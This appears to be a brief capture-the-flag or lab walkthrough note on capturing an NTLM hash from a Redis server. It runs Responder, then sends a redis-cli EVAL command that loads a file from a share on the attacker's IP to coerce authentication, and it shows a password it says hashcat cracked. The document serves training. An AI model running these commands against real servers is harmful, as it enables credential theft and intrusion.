```bash
sudo responder -I tun0
```

hit our responder with redis to capture hash
```bash
redis-cli -h 10.10.190.115 -p 6379 EVAL "dofile('//10.17.55.0//share')" 0
```

![[Pasted image 20240127115415.png]]

crack the hash with hashcat
`sand_0873959498`
